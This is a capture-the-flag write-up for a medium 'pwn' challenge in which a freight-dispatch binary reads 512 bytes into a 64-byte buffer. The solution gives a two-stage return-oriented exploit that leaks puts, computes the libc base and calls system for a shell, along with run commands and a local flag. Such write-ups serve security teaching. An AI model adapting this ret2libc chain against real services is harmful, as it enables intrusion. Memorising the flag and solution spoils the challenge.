# Parcel Bomb

**Category:** pwn  **Difficulty:** medium  **Author:** abu

> Sparrow Freight dispatch takes your waybill number, logs it, and waves you off. Trouble is, the intake clerk never learned when to stop listening.
>
> No spare key was left out this time, so bring your own way in.

Handout: `challenge/dispatch.zip` (binary, libc, ld). Source is in `challenge/dispatch.c`.

## Solution

Same overflow as Papers Please, minus the free win function. `vuln()` reads 512 bytes into `char buf[64]`, no canary, no PIE. Return address at offset 72.

Nothing reads the flag for us, so we need a shell, which means `system` in libc, which means a leak first.

glibc 2.39 dropped `__libc_csu_init`, so the usual `pop rdi; ret` from there is gone. The binary carries one anyway (`pop_rdi_ret` at `0x401176`).

Stage 1, leak `puts` and go back to `vuln` for a second round:

```python
b"A"*72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
```

`libc_base = leak - libc.sym['puts']` with the shipped `libc.so.6`.

Stage 2, ret2libc. The extra `ret` keeps the stack aligned for `system`:

```python
b"A"*72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
```

Then `cat /flag`.

```
mkdir h && cd h && unzip ../challenge/dispatch.zip
python3 ../solution/exploit.py <host> <port>
```

(The script loads `dispatch` and `libc.so.6` from the current directory.)

Flag is dynamic per team. Local one: `H7CTF{r3t2l1bc_l34k_th3n_sh3ll_d1sp4tch}`
